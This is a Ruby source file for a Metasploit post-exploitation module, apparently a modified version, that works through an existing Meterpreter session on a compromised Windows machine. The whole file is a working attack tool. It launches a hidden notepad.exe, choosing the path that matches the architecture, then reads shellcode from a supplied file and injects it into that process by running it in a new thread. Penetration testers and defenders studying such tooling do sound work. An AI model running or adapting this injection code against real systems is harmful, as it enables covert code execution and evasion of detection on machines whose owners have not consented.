##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/common'

class MetasploitModule < Msf::Post
  include Msf::Post::Common

  include Msf::Post::Windows::Process

  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Windows Manage Memory Payload Injection Module',
                      'Description'  => %q{
        This module will inject into the memory of a process a specified windows payload.
        If a payload or process is not provided one will be created by default
        using a reverse x86 TCP Meterpreter Payload.
      },
                      'License'      => MSF_LICENSE,
                      'Author'       => ['Carlos Perez <carlos_perez[at]darkoperator.com>',
                                         'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>' # added multiple payload support
                      ],
                      'Platform'     => ['win'],
                      'SessionTypes' => ['meterpreter']
          ))

    register_options(
            [
                    OptString.new('SHELLCODE_FILE', [true, 'File store shellcode', nil]),
                    OptEnum.new('ARCH', [true, 'shellcode Arch.', ARCH_X86, [ARCH_X86, ARCH_X64]]),
            ])
  end

  # Run Method for when run command is issued
  def run

    # syinfo is only on meterpreter sessions
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?

    if File.file?(File.join(Msf::Config.loot_directory, datastore['SHELLCODE_FILE']))
      @shellcode_path = File.join(Msf::Config.loot_directory, datastore['SHELLCODE_FILE'])
    elsif File.file?(datastore['SHELLCODE_FILE'])
      @shellcode_path = datastore['SHELLCODE_FILE']
    else
      pub_json_result(false,
                      "#{datastore['SHELLCODE_FILE']} not found",
                      nil,
                      self.uuid)
      return
    end
    pid = create_temp_proc
    if pid == nil
      return
    end
    inject_into_pid(pid)
  end


  def create_temp_proc()
    windir = client.sys.config.getenv('windir')
    arch   = datastore['ARCH']
    # Select path of executable to run depending the architecture
    if arch == ARCH_X86 and client.arch == ARCH_X86
      cmd = "#{windir}\\System32\\notepad.exe"
    elsif arch == ARCH_X64 and client.arch == ARCH_X64
      cmd = "#{windir}\\System32\\notepad.exe"
    elsif arch == ARCH_X64 and client.arch == ARCH_X86
      cmd = "#{windir}\\Sysnative\\notepad.exe"
    elsif arch == ARCH_X86 and client.arch == ARCH_X64
      cmd = "#{windir}\\SysWOW64\\notepad.exe"
    end
    vprint_status(cmd)

    begin
      #proc = client.sys.process.execute(cmd, nil, {'Hidden' => true}, {'Suspended' => true})
      proc = client.sys.process.execute(cmd, nil, {'Hidden' => true})
    rescue Rex::Post::Meterpreter::RequestError
      pub_json_result(false,
                      "create temp process failed",
                      nil,
                      self.uuid)
      return nil
    end

    return proc.pid
  end

  def inject_into_pid(pid)
    begin
      vprint_status("Preparing  for PID #{pid}")
      raw    = ::File.read(@shellcode_path)
      thread = execute_shellcode(raw, nil, pid)
      unless thread
        pub_json_result(false,
                        'create new thread failed',
                        nil,
                        self.uuid)
      end
      pub_json_result(true,
                      nil,
                      {:pid => pid, :pname => nil},
                      self.uuid)
    rescue Rex::Post::Meterpreter::RequestError => e
      pub_json_result(false,
                      e,
                      nil,
                      self.uuid)
    end
  end
end
